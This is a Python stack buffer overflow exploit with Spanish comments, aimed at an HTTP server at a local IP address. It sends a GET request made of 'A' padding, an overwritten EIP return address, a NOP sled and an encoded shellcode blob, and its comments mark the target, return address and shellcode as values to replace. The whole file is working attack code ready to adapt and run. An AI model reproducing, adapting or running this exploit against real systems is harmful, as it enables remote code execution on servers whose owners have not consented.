#!/usr/bin/python3

import socket
import sys
from struct import pack

# Verifica si se proporciona algún argumento al script
if len(sys.argv) != 1:
    print("\n[!] Uso: ./Shellcode.py \n")
    exit(1)

# Configuración de la dirección IP y el puerto del servidor remoto
ip_address = "192.168.68.128"  # *******Cambiar esto*******
port = 80 # *******Cambiar esto*******

# Solicita al usuario que ingrese el valor numérico del desplazamiento (offset)
offset = int(input(f"\nIntroduce aqui el valor numerico del offset:  "))

# Construye la cadena EIP para el control del flujo en little endian.
EIP = pack("<L", 0x7644ae24) # *******Cambiar esto*******

# Shellcode generado para ejecutar un payload específico
ESP =(b"\xdb\xd5\xd9\x74\x24\xf4\xb8\x72\x5b\x1b\x98\x5a"  #  *******Cambiar esto*******
b"\x29\xc9\xb1\x52\x31\x42\x17\x83\xea\xfc\x03\x30"
b"\x48\xf9\x6d\x48\x86\x7f\x8d\xb0\x57\xe0\x07\x55"
b"\x66\x20\x73\x1e\xd9\x90\xf7\x72\xd6\x5b\x55\x66"
b"\x6d\x29\x72\x89\xc6\x84\xa4\xa4\xd7\xb5\x95\xa7"
b"\x5b\xc4\xc9\x07\x65\x07\x1c\x46\xa2\x7a\xed\x1a"
b"\x7b\xf0\x40\x8a\x08\x4c\x59\x21\x42\x40\xd9\xd6"
b"\x13\x63\xc8\x49\x2f\x3a\xca\x68\xfc\x36\x43\x72"
b"\xe1\x73\x1d\x09\xd1\x08\x9c\xdb\x2b\xf0\x33\x22"
b"\x84\x03\x4d\x63\x23\xfc\x38\x9d\x57\x81\x3a\x5a"
b"\x25\x5d\xce\x78\x8d\x16\x68\xa4\x2f\xfa\xef\x2f"
b"\x23\xb7\x64\x77\x20\x46\xa8\x0c\x5c\xc3\x4f\xc2"
b"\xd4\x97\x6b\xc6\xbd\x4c\x15\x5f\x18\x22\x2a\xbf"
b"\xc3\x9b\x8e\xb4\xee\xc8\xa2\x97\x66\x3c\x8f\x27"
b"\x77\x2a\x98\x54\x45\xf5\x32\xf2\xe5\x7e\x9d\x05"
b"\x09\x55\x59\x99\xf4\x56\x9a\xb0\x32\x02\xca\xaa"
b"\x93\x2b\x81\x2a\x1b\xfe\x06\x7a\xb3\x51\xe7\x2a"
b"\x73\x02\x8f\x20\x7c\x7d\xaf\x4b\x56\x16\x5a\xb6"
b"\x31\xd9\x33\xfc\xa6\xb1\x41\xfc\x2c\x90\xcf\x1a"
b"\x46\x04\x86\xb5\xff\xbd\x83\x4d\x61\x41\x1e\x28"
b"\xa1\xc9\xad\xcd\x6c\x3a\xdb\xdd\x19\xca\x96\xbf"
b"\x8c\xd5\x0c\xd7\x53\x47\xcb\x27\x1d\x74\x44\x70"
b"\x4a\x4a\x9d\x14\x66\xf5\x37\x0a\x7b\x63\x7f\x8e"
b"\xa0\x50\x7e\x0f\x24\xec\xa4\x1f\xf0\xed\xe0\x4b"
b"\xac\xbb\xbe\x25\x0a\x12\x71\x9f\xc4\xc9\xdb\x77"
b"\x90\x21\xdc\x01\x9d\x6f\xaa\xed\x2c\xc6\xeb\x12"
b"\x80\x8e\xfb\x6b\xfc\x2e\x03\xa6\x44\x4e\xe6\x62"
b"\xb1\xe7\xbf\xe7\x78\x6a\x40\xd2\xbf\x93\xc3\xd6"
b"\x3f\x60\xdb\x93\x3a\x2c\x5b\x48\x37\x3d\x0e\x6e"
b"\xe4\x3e\x1b")


# Función principal para explotar la vulnerabilidad
def exploit():
    # Crea un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conecta al servidor remoto
    s.connect((ip_address, port))

    # Imprime un mensaje indicando que se está enviando el shellcode
    print(f"\nEnviando Shellcode")

    # Construye y envía el payload al servidor remoto
    s.send(b"GET " + b"A" * offset + EIP + b"\x90" * 16 + ESP + b" HTTP/1.1" + b"\r\n" * 2)

    # Recibe la respuesta del servidor
    response = s.recv(1024)

    # Cierra la conexión
    s.close()

# Punto de entrada del script
if __name__ == '__main__':
    exploit()

